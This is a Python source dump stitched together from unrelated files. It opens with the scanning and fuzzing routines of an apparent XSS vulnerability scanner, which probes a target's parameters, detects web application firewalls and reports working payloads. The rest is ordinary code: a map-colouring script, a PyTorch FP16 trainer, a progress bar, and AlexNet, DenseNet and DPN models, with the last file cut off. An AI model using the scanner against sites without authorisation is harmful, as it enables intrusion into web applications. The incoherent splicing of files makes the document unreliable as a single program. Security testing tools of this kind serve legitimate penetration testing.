    GET, POST = (False, True) if paramData else (True, False)
    # If the user hasn't supplied the root url with http(s), we will handle it
    if not target.startswith('http'):
        try:
            response = requester('https://' + target, {},
                                 headers, GET, delay, timeout)
            target = 'https://' + target
        except:
            target = 'http://' + target
    logger.debug('Scan target: {}'.format(target))
    response = requester(target, {}, headers, GET, delay, timeout).text

    if not skipDOM:
        logger.run('Checking for DOM vulnerabilities')
        highlighted = dom(response)
        if highlighted:
            logger.good('Potentially vulnerable objects found')
            logger.red_line(level='good')
            for line in highlighted:
                logger.no_format(line, level='good')
            logger.red_line(level='good')
    host = urlparse(target).netloc  # Extracts host out of the url
    logger.debug('Host to scan: {}'.format(host))
    url = getUrl(target, GET)
    logger.debug('Url to scan: {}'.format(url))
    params = getParams(target, paramData, GET)
    logger.debug_json('Scan parameters:', params)
    if not params:
        logger.error('No parameters to test.')
        quit()
    WAF = wafDetector(
        url, {list(params.keys())[0]: xsschecker}, headers, GET, delay, timeout)
    if WAF:
        logger.error('WAF detected: %s%s%s' % (green, WAF, end))
    else:
        logger.good('WAF Status: %sOffline%s' % (green, end))

    for paramName in params.keys():
        paramsCopy = copy.deepcopy(params)
        logger.info('Testing parameter: %s' % paramName)
        if encoding:
            paramsCopy[paramName] = encoding(xsschecker)
        else:
            paramsCopy[paramName] = xsschecker
        response = requester(url, paramsCopy, headers, GET, delay, timeout)
        occurences = htmlParser(response, encoding)
        positions = occurences.keys()
        logger.debug('Scan occurences: {}'.format(occurences))
        if not occurences:
            logger.error('No reflection found')
            continue
        else:
            logger.info('Reflections found: %i' % len(occurences))

        logger.run('Analysing reflections')
        efficiencies = filterChecker(
            url, paramsCopy, headers, GET, delay, occurences, timeout, encoding)
        logger.debug('Scan efficiencies: {}'.format(efficiencies))
        logger.run('Generating payloads')
        vectors = generator(occurences, response.text)
        total = 0
        for v in vectors.values():
            total += len(v)
        if total == 0:
            logger.error('No vectors were crafted.')
            continue
        logger.info('Payloads generated: %i' % total)
        progress = 0
        for confidence, vects in vectors.items():
            for vect in vects:
                if core.config.globalVariables['path']:
                    vect = vect.replace('/', '%2F')
                loggerVector = vect
                progress += 1
                logger.run('Progress: %i/%i\r' % (progress, total))
                if not GET:
                    vect = unquote(vect)
                efficiencies = checker(
                    url, paramsCopy, headers, GET, delay, vect, positions, timeout, encoding)
                if not efficiencies:
                    for i in range(len(occurences)):
                        efficiencies.append(0)
                bestEfficiency = max(efficiencies)
                if bestEfficiency == 100 or (vect[0] == '\\' and bestEfficiency >= 95):
                    logger.red_line()
                    logger.good('Payload: %s' % loggerVector)
                    logger.info('Efficiency: %i' % bestEfficiency)
                    logger.info('Confidence: %i' % confidence)
                    if not skip:
                        choice = input(
                            '%s Would you like to continue scanning? [y/N] ' % que).lower()
                        if choice != 'y':
                            quit()
                elif bestEfficiency > minEfficiency:
                    logger.red_line()
                    logger.good('Payload: %s' % loggerVector)
                    logger.info('Efficiency: %i' % bestEfficiency)
                    logger.info('Confidence: %i' % confidence)
        logger.no_format('')


import copy
from urllib.parse import urlparse

from core.colors import green, end
from core.config import xsschecker
from core.fuzzer import fuzzer
from core.requester import requester
from core.utils import getUrl, getParams
from core.wafDetector import wafDetector
from core.log import setup_logger

logger = setup_logger(__name__)


def singleFuzz(target, paramData, encoding, headers, delay, timeout):
    GET, POST = (False, True) if paramData else (True, False)
    # If the user hasn't supplied the root url with http(s), we will handle it
    if not target.startswith('http'):
        try:
            response = requester('https://' + target, {},
                                 headers, GET, delay, timeout)
            target = 'https://' + target
        except:
            target = 'http://' + target
    logger.debug('Single Fuzz target: {}'.format(target))
    host = urlparse(target).netloc  # Extracts host out of the url
    logger.debug('Single fuzz host: {}'.format(host))
    url = getUrl(target, GET)
    logger.debug('Single fuzz url: {}'.format(url))
    params = getParams(target, paramData, GET)
    logger.debug_json('Single fuzz params:', params)
    if not params:
        logger.error('No parameters to test.')
        quit()
    WAF = wafDetector(
        url, {list(params.keys())[0]: xsschecker}, headers, GET, delay, timeout)
    if WAF:
        logger.error('WAF detected: %s%s%s' % (green, WAF, end))
    else:
        logger.good('WAF Status: %sOffline%s' % (green, end))

    for paramName in params.keys():
        logger.info('Fuzzing parameter: %s' % paramName)
        paramsCopy = copy.deepcopy(params)
        paramsCopy[paramName] = xsschecker
        fuzzer(url, paramsCopy, headers, GET,
               delay, timeout, WAF, encoding)



import cv2
import numpy as np
import sys
from matplotlib import pyplot as plt

try:
	MAP_IMAGE_PATH = sys.argv[1]
except IndexError:
	print("Error: please specify an image.")
	exit(0)
ESCAPE_KEY_CHARACTER = 27
NO_COLOR = -1
NOT_MARKED = -1
BACKGROUND_MARK = -2
SLEEP_TIME_IN_MILLISECONDS = 100
MINIMUM_BORDER_WIDTH_RATIO = 0.15
IMPORTANT_COLOR_HIGH_THRESHOLD = 256 - 35
IMPORTANT_COLOR_LOW_THRESHOLD = 35
MINIMUM_REGION_AREA_RATIO = 0.0005
MAXIMUM_NEIGHBOR_PIXEL_COLOR_DIFFERENCE = 50
INF = 10 ** 30
MAXIMUM_NUMBER_OF_REGIONS = 1000
COLORING_COLORS = [(169,106,62), (109,95,63), (241,202,173),(20,65,87)]
DX = [-1, +1, 0, 0]
DY = [0, 0, -1, +1]
SHARPEN_KERNEL = np.array([[-1, -1, -1], [-1, 9, -1], [-1, -1, -1]])
MAXIMUM_IMAGE_WIDTH = 1000
MAXIMUM_IMAGE_HEIGHT = 1000

image = cv2.imread(MAP_IMAGE_PATH, cv2.IMREAD_COLOR)
height = len(image)
width = len(image[0])
if width > MAXIMUM_IMAGE_WIDTH or height > MAXIMUM_IMAGE_HEIGHT:
	print("Error: please specify an image with smaller dimensions.")
	exit(0)
total_area = width * height
mark = [[NOT_MARKED for i in range(width)] for j in range(height)]
nodes = []
regions = [[] for i in range(MAXIMUM_NUMBER_OF_REGIONS)]
regions_border = [[] for i in range(MAXIMUM_NUMBER_OF_REGIONS)]
nodes_color = [NO_COLOR for i in range(MAXIMUM_NUMBER_OF_REGIONS)]

class Node:
	def __init__(self, node_id, node_x, node_y):
		self.id = node_id
		self.x = node_x
		self.y = node_y
		self.adj = []
	def add_edge(self, node):
		self.adj.append(node.id)

def apply_threshold():
	for y in range(height):
		for x in range(width):
			b, g, r = image[y][x]
			r, g, b = int(r), int(g), int(b)
			if r + g + b < IMPORTANT_COLOR_LOW_THRESHOLD * 3:
				image[y][x] = (255, 255, 255)
				mark[y][x] = BACKGROUND_MARK
			if r + g + b > IMPORTANT_COLOR_HIGH_THRESHOLD * 3:
				image[y][x] = (255, 255, 255)
				mark[y][x] = BACKGROUND_MARK

def whiten_background():
	for y in range(height):
		for x in range(width):
			if mark[y][x] == NOT_MARKED or mark[y][x] == BACKGROUND_MARK:
				image[y][x] = (255, 255, 255)

def get_all_regions_pixels():
	for y in range(height):
		for x in range(width):
			region_mark = mark[y][x]
			regions[region_mark].append((x, y))
			if is_on_border(x, y):
				regions_border[region_mark].append((x, y))

def find_graph_nodes():
	for y in range(height):
		for x in range(width):
			if mark[y][x] == NOT_MARKED:
				color_area = get_region_area(x, y, NOT_MARKED, len(nodes))
				if color_area > MINIMUM_REGION_AREA_RATIO * total_area:
					nodes.append(Node(len(nodes), x, y))
				else:
					get_region_area(x, y, len(nodes), NOT_MARKED)
	get_all_regions_pixels()

def is_inside(x, y):
	if x < 0 or x >= width or y < 0 or y >= height:
		return False
	return True

def is_on_border(x, y):
	if mark[y][x] == BACKGROUND_MARK:
		return False
	for k in range(4):
		x2 = x + DX[k]
		y2 = y + DY[k]
		if is_inside(x2, y2) and mark[y2][x2] == BACKGROUND_MARK:
			return True
	return False

def same_pixel_colors(x1, y1, x2, y2):
	if not is_inside(x1, y1) or not is_inside(x2, y2):
		return False
	b1, g1, r1 = image[y1][x1]
	b2, g2, r2 = image[y2][x2]
	r1, g1, b1 = int(r1), int(g1), int(b1)
	r2, g2, b2 = int(r2), int(g2), int(b2)
	diff = abs(r1 - r2) + abs(g1 - g2) + abs(b1 - b2)
	return diff <= 3 * MAXIMUM_NEIGHBOR_PIXEL_COLOR_DIFFERENCE

def get_region_area(start_x, start_y, src_mark, dst_mark):
	if not is_inside(start_x, start_y) or mark[start_y][start_x] != src_mark:
		return 0
	color_area = 0
	queue = [(start_x, start_y)]
	mark[start_y][start_x] = dst_mark
	while queue:
		x, y = queue.pop(0)
		mark[y][x] = dst_mark
		color_area += 1
		for k in range(4):
			x2 = x + DX[k]
			y2 = y + DY[k]
			if is_inside(x2, y2) and mark[y2][x2] == src_mark and same_pixel_colors(x, y, x2, y2):
				mark[y2][x2] = dst_mark
				queue.append((x2, y2))
	return color_area

def are_adjacent(node1:Node, node2:Node):
	start_x, start_y = node1.x, node1.y
	end_x, end_y = node2.x, node2.y
	min_distance_sqr = INF
	for u in regions_border[mark[start_y][start_x]]:
		for v in regions_border[mark[end_y][end_x]]:
			tmp_distance_sqr = (u[0] - v[0]) * (u[0] - v[0]) + (u[1] - v[1]) * (u[1] - v[1])
			if tmp_distance_sqr < min_distance_sqr:
				min_distance_sqr = tmp_distance_sqr
				start_x, start_y = u[0], u[1]
				end_x, end_y = v[0], v[1]
	dx, dy = end_x - start_x, end_y - start_y
	if abs(dx) + abs(dy) <= 1:
		return True
	dx, dy = float(dx), float(dy)
	border_width_threshold = MINIMUM_BORDER_WIDTH_RATIO * (width * width + height * height)
	if min_distance_sqr >= border_width_threshold:
		return False
	total_steps = int(2 * ((width * width + height * height) ** 0.5))
	for i in range(total_steps):
		x = int(start_x + i * dx / total_steps + 0.5)
		y = int(start_y + i * dy / total_steps + 0.5)
		if mark[y][x] >= 0 and (x != start_x or y != start_y) and (x != end_x or y != end_y):
			return False
	return True

def add_graph_edges():
	for i in range(len(nodes)):
		for j in range(len(nodes)):
			if j > i and are_adjacent(nodes[i], nodes[j]):
				nodes[i].add_edge(nodes[j])
				nodes[j].add_edge(nodes[i])

def change_region_color(node:Node, pixel_color):
	region_idx = mark[node.y][node.x]
	for i in range(len(regions[region_idx])):
		x = regions[region_idx][i][0]
		y = regions[region_idx][i][1]
		image[y][x] = pixel_color

def colorize_map(node_index):
	if node_index == len(nodes):
		for i in range(len(nodes)):
			change_region_color(nodes[i], COLORING_COLORS[nodes_color[i]])
		cv2.imshow('Colorized Map', image)
		key = cv2.waitKey(SLEEP_TIME_IN_MILLISECONDS)
		if key == ESCAPE_KEY_CHARACTER:
			cv2.destroyAllWindows()
			exit()
		return
	for i in range(len(COLORING_COLORS)):
		is_color_valid = True
		for u in nodes[node_index].adj:
			if nodes_color[u] == i:
				is_color_valid = False
				break
		if is_color_valid:
			nodes_color[node_index] = i
			colorize_map(node_index + 1)
			nodes_color[node_index] = NO_COLOR

# cv2.imshow('Original Map', image)

print('Please wait for preprocessing...')

apply_threshold()
image = cv2.medianBlur(image, 3)
apply_threshold()
image = cv2.filter2D(image, -1, SHARPEN_KERNEL)
apply_threshold()

find_graph_nodes()
add_graph_edges()

whiten_background()

print('Preprocessing finished.')

# cv2.imshow('Modified Map', image)

colorize_map(0)

cv2.waitKey(0)
cv2.destroyAllWindows()

from __future__ import print_function

import os

import torch
from torch import nn, optim
from torch.autograd import Variable
from torch.optim.lr_scheduler import MultiStepLR


# from utils import progress_bar


class Trainer(object):
    def __init__(self,
                 model_name,
                 model,
                 lr,
                 train_on_gpu=False,
                 fp16=False,
                 loss_scaling=False):
        self.model = model
        self.lr = lr
        self.model_name = model_name
        self.train_on_gpu = train_on_gpu
        self.loss_scaling = loss_scaling
        if train_on_gpu and torch.backends.cudnn.enabled:
            self.fp16_mode = fp16
        else:
            self.fp16_mode = False
            self.loss_scaling = False
            print("CuDNN backend not available. Can't train with FP16.")

        self.best_acc = 0
        self.best_epoch = 0
        self._LOSS_SCALE = 128.0

        if self.train_on_gpu:
            self.model = self.model

        if self.fp16_mode:
            self.model = self.network_to_half(self.model)
            self.model_params, self.master_params = self.prep_param_list(
                self.model)

        # Declare optimizer.
        if not hasattr(self, 'optimizer'):
            if self.fp16_mode:
                self.optimizer = optim.SGD(
                    self.master_params, self.lr, momentum=0.9, weight_decay=5e-4)
            else:
                self.optimizer = optim.SGD(
                    self.model.parameters(),
                    self.lr,
                    momentum=0.9,
                    weight_decay=5e-4)
        self.scheduler = MultiStepLR(
            self.optimizer, milestones=[10, 20, 50, 100, 180], gamma=0.1)
        # if self.train_on_gpu:
        #    self.model = nn.DataParallel(self.model)

        print('\n Model: {} | Training on GPU: {} | Mixed Precision: {} |'
              'Loss Scaling: {}'.format(self.model_name, self.train_on_gpu,
                                        self.fp16_mode, self.loss_scaling))

    def prep_param_list(self, model):
        """
        Create two set of of parameters. One in FP32 and other in FP16.
        Since gradient updates are with numbers that are out of range
        for FP16 this a necessity. We'll update the weights with FP32
        and convert them back to FP16.
        """
        model_params = [p for p in model.parameters() if p.requires_grad]
        master_params = [p.detach().clone().float() for p in model_params]

        for p in master_params:
            p.requires_grad = True

        return model_params, master_params

    def master_params_to_model_params(self, model_params, master_params):
        """
        Move FP32 master params to FP16 model params.
        """
        for model, master in zip(model_params, master_params):
            model.data.copy_(master.data)

    def model_grads_to_master_grads(self, model_params, master_params):
        for model, master in zip(model_params, master_params):
            if master.grad is None:
                master.grad = Variable(master.data.new(*master.data.size()))
            master.grad.data.copy_(model.grad.data)

    def BN_convert_float(self, module):
        '''
        Designed to work with network_to_half.
        BatchNorm layers need parameters in single precision.
        Find all layers and convert them back to float. This can't
        be done with built in .apply as that function will apply
        fn to all modules, parameters, and buffers. Thus we wouldn't
        be able to guard the float conversion based on the module type.
        '''
        if isinstance(module, torch.nn.modules.batchnorm._BatchNorm):
            module.float()
        for child in module.children():
            self.BN_convert_float(child)
        return module

    class tofp16(nn.Module):
        """
        Add a layer so inputs get converted to FP16.
        Model wrapper that implements::
            def forward(self, input):
                return input.half()
        """

        def __init__(self):
            super(Trainer.tofp16, self).__init__()

        def forward(self, input):
            return input.half()

    def network_to_half(self, network):
        """
        Convert model to half precision in a batchnorm-safe way.
        """
        return nn.Sequential(self.tofp16(),
                             self.BN_convert_float(network.half()))

    def warmup_learning_rate(self, init_lr, no_of_steps, epoch, len_epoch):
        """Warmup learning rate for 5 epoch"""
        factor = no_of_steps // 30
        lr = init_lr * (0.1 ** factor)
        """Warmup"""
        lr = lr * float(1 + epoch + no_of_steps * len_epoch) / (5. * len_epoch)
        return lr

    def train(self, epoch, no_of_steps, trainloader):
        self.model.train()

        train_loss, correct, total = 0, 0, 0

        # If epoch less than 5 use warmup, else use scheduler.
        if epoch < 5:
            lr = self.warmup_learning_rate(self.lr, no_of_steps, epoch,
                                           len(trainloader))
            for param_group in self.optimizer.param_groups:
                param_group['lr'] = lr
        elif epoch == 5:
            for param_group in self.optimizer.param_groups:
                param_group['lr'] = self.lr

        # scheduler = MultiStepLR(
        #    self.optimizer, milestones=[80, 120, 160, 180], gamma=0.1)
        # if epoch >= 5:
        #    scheduler.step(epoch=epoch)

        print('Learning Rate: %g' % (list(
            map(lambda group: group['lr'], self.optimizer.param_groups)))[0])
        # Loss criterion is in FP32.
        criterion = nn.CrossEntropyLoss()

        for idx, (inputs, targets) in enumerate(trainloader):
            if self.train_on_gpu:
                inputs, targets = inputs.cuda(), targets.cuda()
            self.model.zero_grad()
            outputs = self.model(inputs)
            # We calculate the loss in FP32 since reduction ops can be
            # wrong when represented in FP16.
            loss = criterion(outputs, targets)
            if self.loss_scaling:
                # Sometime the loss may become small to be represente in FP16
                # So we scale the losses by a large power of 2, 2**7 here.
                loss = loss * self._LOSS_SCALE
            # Calculate the gradients
            loss.backward()
            if self.fp16_mode:
                # Now we move the calculated gradients to the master params
                # so that we can apply the gradient update in FP32.
                self.model_grads_to_master_grads(self.model_params,
                                                 self.master_params)
                if self.loss_scaling:
                    # If we scaled our losses now is a good time to scale it
                    # back since our gradients are in FP32.
                    for params in self.master_params:
                        params.grad.data = params.grad.data / self._LOSS_SCALE
                # Apply weight update in FP32.
                self.optimizer.step()
                # Copy the updated weights back FP16 model weights.
                self.master_params_to_model_params(self.model_params,
                                                   self.master_params)
            else:
                self.optimizer.step()

            train_loss += loss.item()
            _, predicted = outputs.max(1)
            total += targets.size(0)
            correct += (targets == predicted).sum().item()

            # progress_bar(
            #     idx, len(trainloader), 'Loss: %.3f | Acc: %.3f%% (%d/%d)' %
            #     (train_loss / (idx + 1), 100. * correct / total, correct,
            #      total))
            print(
                idx, len(trainloader), 'Loss: %.3f | Acc: %.3f%% (%d/%d)' %
                                       (train_loss / (idx + 1), 100. * correct / total, correct,
                                        total)
            )

        if epoch >= 5:  # modified at 2020.09.09
            self.scheduler.step()

    def evaluate(self, epoch, testloader):
        self.model.eval()

        test_loss = 0
        correct = 0
        total = 0

        criterion = nn.CrossEntropyLoss()

        with torch.no_grad():
            for idx, (test_x, test_y) in enumerate(testloader):
                if self.train_on_gpu:
                    test_x, test_y = test_x.cuda(), test_y.cuda()
                outputs = self.model(test_x)
                loss = criterion(outputs, test_y)

                test_loss += loss.item()
                _, predicted = outputs.max(1)
                total += test_y.size(0)
                correct += (predicted == test_y).sum().item()

                # progress_bar(
                #     idx, len(testloader), 'Loss: %.3f | Acc: %.3f%% (%d/%d)' %
                #     (loss / (idx + 1), 100. * correct / total, correct, total))
                print(
                    idx, len(testloader), 'Loss: %.3f | Acc: %.3f%% (%d/%d)' %
                                          (loss / (idx + 1), 100. * correct / total, correct, total))

        acc = 100.0 * correct / total
        if acc > self.best_acc:
            self.save_model(self.model, self.model_name, acc, epoch)

    def save_model(self, model, model_name, acc, epoch):
        state = {
            'net': model.state_dict(),
            'acc': acc,
            'epoch': epoch,
        }

        if self.fp16_mode:
            save_name = os.path.join('weights', model_name + '_fp16',
                                     'weights.%03d.%.03f.pt' % (epoch, acc))
        else:
            save_name = os.path.join('weights', model_name,
                                     'weights.%03d.%.03f.pt' % (epoch, acc))

        if not os.path.exists(os.path.dirname(save_name)):
            os.makedirs(os.path.dirname(save_name))

        torch.save(state, save_name)
        print("\nSaved state at %.03f%% accuracy. Prev accuracy: %.03f%%" %
              (acc, self.best_acc))
        self.best_acc = acc
        self.best_epoch = epoch

    def load_model(self, path=None):
        """
        Load previously saved model. THis doesn't check for precesion type.
        """
        if path is not None:
            checkpoint_name = path
        elif self.fp16_mode:
            checkpoint_name = os.path.join(
                'weights', self.model_name + '_fp16',
                           'weights.%03d.%.03f.pt' % (self.best_epoch, self.best_acc))
        else:
            checkpoint_name = os.path.join(
                'weights', self.model_name + '_fp16',
                           'weights.%03d.%.03f.pt' % (self.best_epoch, self.best_acc))
        if not os.path.exists(checkpoint_name):
            print("Best model not found")
            return
        checkpoint = torch.load(checkpoint_name)
        self.model.load_state_dict(checkpoint['net'])
        self.best_acc = checkpoint['acc']
        self.best_epoch = checkpoint['epoch']
        print("Loaded Model with accuracy: %.3f%%, from epoch: %d" %
              (checkpoint['acc'], checkpoint['epoch'] + 1))

    def train_and_evaluate(self, traindataloader, testdataloader, no_of_steps):
        self.best_acc = 0.0
        for i in range(no_of_steps):
            print('\nEpoch: %d' % (i + 1))
            self.train(i, no_of_steps, traindataloader)
            self.evaluate(i, testdataloader)


import os
import sys
import time

_, term_width = os.popen('stty size', 'r').read().split()
term_width = int(term_width)

TOTAL_BAR_LENGTH = 65.
last_time = time.time()
begin_time = last_time


def progress_bar(current, total, msg=None):
    global last_time, begin_time
    if current == 0:
        begin_time = time.time()  # Reset for new bar.

    cur_len = int(TOTAL_BAR_LENGTH * current / total)
    rest_len = int(TOTAL_BAR_LENGTH - cur_len) - 1

    sys.stdout.write(' [')
    for i in range(cur_len):
        sys.stdout.write('=')
    sys.stdout.write('>')
    for i in range(rest_len):
        sys.stdout.write('.')
    sys.stdout.write(']')

    cur_time = time.time()
    step_time = cur_time - last_time
    last_time = cur_time
    tot_time = cur_time - begin_time

    L = []
    L.append('  Step: %s' % format_time(step_time))
    L.append(' | Tot: %s' % format_time(tot_time))
    if msg:
        L.append(' | ' + msg)

    msg = ''.join(L)
    sys.stdout.write(msg)
    for i in range(term_width - int(TOTAL_BAR_LENGTH) - len(msg) - 3):
        sys.stdout.write(' ')

    # Go back to the center of the bar.
    for i in range(term_width - int(TOTAL_BAR_LENGTH / 2) + 2):
        sys.stdout.write('\b')
    sys.stdout.write(' %d/%d ' % (current + 1, total))

    if current < total - 1:
        sys.stdout.write('\r')
    else:
        sys.stdout.write('\n')
    sys.stdout.flush()


def format_time(seconds):
    days = int(seconds / 3600 / 24)
    seconds = seconds - days * 3600 * 24
    hours = int(seconds / 3600)
    seconds = seconds - hours * 3600
    minutes = int(seconds / 60)
    seconds = seconds - minutes * 60
    secondsf = int(seconds)
    seconds = seconds - secondsf
    millis = int(seconds * 1000)

    f = ''
    i = 1
    if days > 0:
        f += str(days) + 'D'
        i += 1
    if hours > 0 and i <= 2:
        f += str(hours) + 'h'
        i += 1
    if minutes > 0 and i <= 2:
        f += str(minutes) + 'm'
        i += 1
    if secondsf > 0 and i <= 2:
        f += str(secondsf) + 's'
        i += 1
    if millis > 0 and i <= 2:
        f += str(millis).zfill(3) + 'ms'
        i += 1
    if f == '':
        f = '0ms'
    return f


import torch
import torch.nn as nn
import os
from torchvision import transforms
from PIL import Image, ImageDraw, ImageFont, ImageFilter

NUM_CLASSES = 10

tran = transforms.Compose([
    transforms.Resize((32, 32), interpolation=Image.BICUBIC),
    transforms.ToTensor(),  # Tensor,張量，高維數組
    transforms.Normalize([0.4914, 0.4822, 0.4465], [0.2023, 0.1994, 0.201])
])


class AlexNet(nn.Module):
    def __init__(self, num_classes=NUM_CLASSES):
        super(AlexNet, self).__init__()

        self.features = nn.Sequential(
            nn.Conv2d(3, 64, kernel_size=3, stride=2, padding=1),
            nn.ReLU(inplace=True),  # y=x+1, x=x+1
            nn.MaxPool2d(kernel_size=2),
            nn.Conv2d(64, 192, kernel_size=3, padding=1),
            nn.ReLU(inplace=True),
            nn.MaxPool2d(kernel_size=2),
            nn.Conv2d(192, 384, kernel_size=3, padding=1),
            nn.ReLU(inplace=True),
            nn.Conv2d(384, 256, kernel_size=3, padding=1),
            nn.ReLU(inplace=True),
            nn.Conv2d(256, 256, kernel_size=3, padding=1),
            nn.ReLU(inplace=True),
            nn.MaxPool2d(kernel_size=2),
        )

        self.classifier = nn.Sequential(
            nn.Dropout(),
            nn.Linear(256 * 2 * 2, 4096),
            nn.ReLU(inplace=True),
            nn.Dropout(),
            nn.Linear(4096, 4096),
            nn.ReLU(inplace=True),
            nn.Linear(4096, num_classes),
        )

    def forward(self, x):
        x = self.features(x)
        x = x.view(x.size(0), 256 * 2 * 2)
        x = self.classifier(x)
        return x


def test():
    net = AlexNet().cuda()
    model_path = os.path.join("weights", "alexnet.pt")
    print("Model PATH: " + model_path)

    checkpoint = torch.load(model_path)
    net.load_state_dict(checkpoint['net'])

    test_image = os.path.join('test.jpg')
    img = Image.open(test_image)
    img_tensor = tran(img)  # CHW, NCHW
    # print(img_tensor.shape)

    input_tensor = img_tensor.unsqueeze_(0).cuda()
    # print(input_tensor.shape)

    y = net(input_tensor)

    # print(y)
    percentage = torch.softmax(y[0], dim=0) * 100
    cl_fp32, index_fp32 = torch.max(percentage, 0)

    classes = ['plane', 'car', 'bird', 'cat', 'deer', 'dog', 'frog', 'horse', 'ship', 'truck']

    font = ImageFont.truetype('LiberationSans-Regular.ttf', 30)

    draw = ImageDraw.Draw(img)
    text = str(classes[index_fp32]) + ' (' + '{:.2f}'.format(cl_fp32.item()) + '%' + ')'
    draw.text((0, 0), text, font=font, fill="#ff00ff", spacing=0, align='left')

    img.save(test_image, 'jpeg')


if __name__ == '__main__':
    test()


'''DenseNet in PyTorch.'''
import math

import torch
import torch.nn as nn
import torch.nn.functional as F


class Bottleneck(nn.Module):
    def __init__(self, in_planes, growth_rate):
        super(Bottleneck, self).__init__()
        self.bn1 = nn.BatchNorm2d(in_planes)
        self.conv1 = nn.Conv2d(
            in_planes, 4 * growth_rate, kernel_size=1, bias=False)
        self.bn2 = nn.BatchNorm2d(4 * growth_rate)
        self.conv2 = nn.Conv2d(
            4 * growth_rate, growth_rate, kernel_size=3, padding=1, bias=False)

    def forward(self, x):
        out = self.conv1(F.relu(self.bn1(x)))
        out = self.conv2(F.relu(self.bn2(out)))
        out = torch.cat([out, x], 1)
        return out


class Transition(nn.Module):
    def __init__(self, in_planes, out_planes):
        super(Transition, self).__init__()
        self.bn = nn.BatchNorm2d(in_planes)
        self.conv = nn.Conv2d(in_planes, out_planes, kernel_size=1, bias=False)

    def forward(self, x):
        out = self.conv(F.relu(self.bn(x)))
        out = F.avg_pool2d(out, 2)
        return out


class DenseNet(nn.Module):
    def __init__(self,
                 block,
                 nblocks,
                 growth_rate=12,
                 reduction=0.5,
                 num_classes=10):
        super(DenseNet, self).__init__()
        self.growth_rate = growth_rate

        num_planes = 2 * growth_rate
        self.conv1 = nn.Conv2d(
            3, num_planes, kernel_size=3, padding=1, bias=False)

        self.dense1 = self._make_dense_layers(block, num_planes, nblocks[0])
        num_planes += nblocks[0] * growth_rate
        out_planes = int(math.floor(num_planes * reduction))
        self.trans1 = Transition(num_planes, out_planes)
        num_planes = out_planes

        self.dense2 = self._make_dense_layers(block, num_planes, nblocks[1])
        num_planes += nblocks[1] * growth_rate
        out_planes = int(math.floor(num_planes * reduction))
        self.trans2 = Transition(num_planes, out_planes)
        num_planes = out_planes

        self.dense3 = self._make_dense_layers(block, num_planes, nblocks[2])
        num_planes += nblocks[2] * growth_rate
        out_planes = int(math.floor(num_planes * reduction))
        self.trans3 = Transition(num_planes, out_planes)
        num_planes = out_planes

        self.dense4 = self._make_dense_layers(block, num_planes, nblocks[3])
        num_planes += nblocks[3] * growth_rate

        self.bn = nn.BatchNorm2d(num_planes)
        self.linear = nn.Linear(num_planes, num_classes)

    def _make_dense_layers(self, block, in_planes, nblock):
        layers = []
        for i in range(nblock):
            layers.append(block(in_planes, self.growth_rate))
            in_planes += self.growth_rate
        return nn.Sequential(*layers)

    def forward(self, x):
        out = self.conv1(x)
        out = self.trans1(self.dense1(out))
        out = self.trans2(self.dense2(out))
        out = self.trans3(self.dense3(out))
        out = self.dense4(out)
        out = F.avg_pool2d(F.relu(self.bn(out)), 4)
        out = out.view(out.size(0), -1)
        out = self.linear(out)
        return out


def DenseNet121():
    return DenseNet(Bottleneck, [6, 12, 24, 16], growth_rate=32)


def DenseNet169():
    return DenseNet(Bottleneck, [6, 12, 32, 32], growth_rate=32)


def DenseNet201():
    return DenseNet(Bottleneck, [6, 12, 48, 32], growth_rate=32)


def DenseNet161():
    return DenseNet(Bottleneck, [6, 12, 36, 24], growth_rate=48)


def densenet_cifar():
    return DenseNet(Bottleneck, [6, 12, 24, 16], growth_rate=12)


def test():
    net = densenet_cifar()
    x = torch.randn(1, 3, 32, 32)
    y = net(x)
    print(y)


if __name__ == '__main__':
    test()


'''Dual Path Networks in PyTorch.'''
import torch
import torch.nn as nn
import torch.nn.functional as F


class Bottleneck(nn.Module):
    def __init__(self, last_planes, in_planes, out_planes, dense_depth, stride,
                 first_layer):
        super(Bottleneck, self).__init__()
        self.out_planes = out_planes
        self.dense_depth = dense_depth

        self.conv1 = nn.Conv2d(
            last_planes, in_planes, kernel_size=1, bias=False)
        self.bn1 = nn.BatchNorm2d(in_planes)
        self.conv2 = nn.Conv2d(
            in_planes,
            in_planes,
            kernel_size=3,
            stride=stride,
            padding=1,
            groups=32,
            bias=False)
        self.bn2 = nn.BatchNorm2d(in_planes)
        self.conv3 = nn.Conv2d(
            in_planes, out_planes + dense_depth, kernel_size=1, bias=False)
        self.bn3 = nn.BatchNorm2d(out_planes + dense_depth)

        self.shortcut = nn.Sequential()
        if first_layer:
            self.shortcut = nn.Sequential(
                nn.Conv2d(
                    last_planes,
                    out_planes + dense_depth,
                    kernel_size=1,
                    stride=stride,
                    bias=False), nn.BatchNorm2d(out_planes + dense_depth))

    def forward(self, x):
        out = F.relu(self.bn1(self.conv1(x)))
        out = F.relu(self.bn2(self.conv2(out)))
        out = self.bn3(self.conv3(out))
        x = self.shortcut(x)
        d = self.out_planes
        out = torch.cat([
            x[:, :d, :, :] + out[:, :d, :, :], x[:, d:, :, :], out[:, d:, :, :]
        ], 1)
        out = F.relu(out)
        return out


class DPN(nn.Module):
    def __init__(self, cfg):
        super(DPN, self).__init__()
        in_planes, out_planes = cfg['in_planes'], cfg['out_planes']
        num_blocks, dense_depth = cfg['num_blocks'], cfg['dense_depth']

        self.conv1 = nn.Conv2d(
            3, 64, kernel_size=3, stride=1, padding=1, bias=False)
        self.bn1 = nn.BatchNorm2d(64)
        self.last_planes = 64
        self.layer1 = self._make_layer(
            in_planes[0],
            out_planes[0],
            num_blocks[0],
            dense_depth[0],
            stride=1)
        self.layer2 = self._make_layer(
            in_planes[1],
            out_planes[1],
            num_blocks[1],
            dense_depth[1],
            stride=2)
        self.layer3 = self._make_layer(
            in_planes[2],
            out_planes[2],
            num_blocks[2],
            dense_depth[2],
            stride=2)
        self.layer4 = self._make_layer(
            in_planes[3],
            out_planes[3],
            num_blocks[3],
            dense_depth[3],
            stride=2)
        self.linear = nn.Linear(
            out_planes[3] + (num_blocks[3] + 1) * dense_depth[3], 10)

    def _make_layer(self, in_planes, out_planes, num_blocks, dense_depth,
                    stride):
        strides = [stride] + [1] * (num_blocks - 1)
        layers = []
        for i, stride in enumerate(strides):
            layers.append(
                Bottleneck(self.last_planes, in_planes, out_planes,
                           dense_depth, stride, i == 0))
            self.last_planes = out_planes + (i + 2) * dense_depth
        return nn.Sequential(*layers)

    def forward(self, x):
        out = F.relu(self.bn1(self.conv1(x)))
        out = self.layer1(out)
        out = self.layer2(out)
        out = self.layer3(out)
        out = self.layer4(out)
        out = F.avg_pool2d(out, 4)
        out = out.view(out.size(0), -1)
        out = self.linear(out)
